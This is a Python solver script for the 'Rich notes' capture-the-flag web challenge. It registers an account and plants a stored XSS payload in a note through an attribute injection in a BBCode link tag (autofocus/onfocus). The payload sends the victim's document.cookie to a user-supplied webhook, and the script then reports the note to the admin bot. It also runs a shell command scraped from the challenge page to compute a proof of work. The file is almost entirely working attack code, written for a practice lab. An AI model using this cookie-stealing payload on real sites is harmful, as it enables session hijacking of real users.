import argparse
import requests
import os
from urllib.parse import quote
from bs4 import BeautifulSoup as bs
from subprocess import check_output


parser = argparse.ArgumentParser('Rich notes solver')
parser.add_argument('-s', '--site', type=str, help='The url to exploit', default='https://rich-notes.challs.olicyber.it/')
parser.add_argument('-w', '--webhook', type=str, required=True, help='The webhook where to send the flag (eg: https://webhook.site/...)')
args = parser.parse_args()


if __name__ == '__main__':
    try:
        check_output('command -v \"hashcash\"', shell=True)
    except:
        print("Missing hashcash")
        exit(1)
    
    webhook = args.webhook
    site = args.site.rstrip("/")
    payload = ('fetch("%s?cookie=" + document.cookie, {"body": null,"method": "GET","mode": "cors","credentials": "include"});' % webhook).replace("\"", "'")
    
    s = requests.Session()
    s.get(site)
    s.post(f'{site}/register', headers={"Content-Type": "application/x-www-form-urlencoded"}, data=f"username={os.urandom(32).hex()}")
    r = s.post(f'{site}/new', headers={"Content-Type": "application/x-www-form-urlencoded"}, data=f'content={quote(f"[link=http://example.com\" autofocus onfocus=\"{payload}\" ]Link[/link]")}')
    note_url = r.url
    r = s.get(f'{site}/report')
    
    print("Calculating POW...")
    soup = bs(r.text, 'html.parser')
    cmd = soup.find('kbd', attrs={"class": "bg-neutral-100 font-mono border border-neutral-300 rounded py-0.5 px-1.5"}).text
    pow = check_output(cmd, shell=True).strip().decode()
    r = s.post(f'{site}/report', headers={"Content-Type": "application/x-www-form-urlencoded"}, data=f'link={note_url}&pow={quote(pow)}')
    print("Check your webhook")
